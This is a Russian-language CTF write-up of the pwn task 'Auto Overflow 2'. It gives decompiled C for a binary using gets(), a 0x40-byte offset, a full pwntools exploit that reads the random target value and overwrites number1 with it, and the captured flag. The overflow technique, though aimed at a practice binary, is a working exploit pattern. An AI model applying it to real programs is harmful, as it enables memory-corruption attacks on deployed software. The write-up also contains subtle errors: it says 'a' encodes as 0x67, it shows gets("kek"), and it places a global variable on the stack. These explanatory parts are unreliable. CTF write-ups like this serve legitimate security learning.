---
title: "Auto Overflow 2"
date: 2026-07-22
tags: [pwn, writeup]
categories: [Pwn]
tagline: ""
header:
  overlay_image: /assets/images/IMG_writeups/IMG_Pwn/IMG_Pwn_Season/Pwn_Season_logo.jpg
  overlay_filter: 0.5
  overlay_color: "#fff"
  actions:
    - label: "Pwn Season"
      url: "https://pwn.spbctf.ru/tasks/pwn1_mc8"
classes: half
layout: single
toc: true
toc_sticky: true
toc_label: "Оглавление"
---

Переполните автоматом, чтобы получить флаг. У вас одна секунда!

- [ELF](https://pwn.spbctf.ru/files/overflow/mc8_censored)

```
nc 109.233.56.90 11588
```

# Solution

## Анализ `main`

Лаба почти ничем не отличается от [Auto Overflow 1]({% post_url writeups/Pwn/Pwn_Season/2026-07-22-Auto_Overflow_1 %}).

```c
int32_t main()
{
    int32_t var_c = 0;
    srand(time(nullptr));
    int32_t rnd = rand();
    printf("Welcome to ");
    printf("OK, here's the deal.\n");
    printf("We want you to set the value of number1 to '%d'.\n", (uint64_t)rnd);
    printf("And you only have 1 second to check your superspeed.\n");
    alarm(1);
    printf("Give me your input: ");
    gets("kek");

    if (number1 != rnd)
    {
        printf("YOU FAILED\n");
        printf("Because, here's the target number: %d\n", (uint64_t)rnd);
        printf("      And here's the your number1: %d\n\n", (uint64_t)number1);
        printf("See the difference?\n");
    }
    else
    {
        printf("Yissss!\n");
        printf("Flag is: spbctf{***********************************}\n");
    }
    return 0;
}
```

Теперь нам нужно записать не строку, а число.

Создам шаблон для `pwntools`:

```bash
pwn template mc8_censored --host 109.233.56.90 --port 11588 > exploit.py
```

## Смещение до number1

Структура стека аналогична Auto Overflow 1:

```
Высокие адреса (rbp)
  ...
  number1 (int32_t)   ← цель: перезаписать это значение
  input_buf           ← gets() пишет сюда
  ...
Низкие адреса
```

От начала `input_buf` до `number1` — `0x40` байт (то же смещение что в AO1).

Отличие от AO1: там мы записывали строку напрямую, здесь нужно записать число как 4-байтовое целое в little-endian через `p32()`.

```
'a' -> 0x67
'aaaa' -> 0x67676767
0x67676767 -> 1734829927
```

## Exploit

```python
io = start()

io.recvuntil(b'of number1 to \'')

num = io.recvuntil(b'\'')[:-1].decode()
num = int(num)

payload = b'q' * 0x40 + p32(num)

io.sendline(payload)

io.interactive()
```

```bash
And you only have 1 second to check your superspeed.
Give me your input: Yissss!
Flag is: spbctf{w3lp_that_w4s_34sy_aft3r_prev1ous_1}
```

```
spbctf{w3lp_that_w4s_34sy_aft3r_prev1ous_1}
```
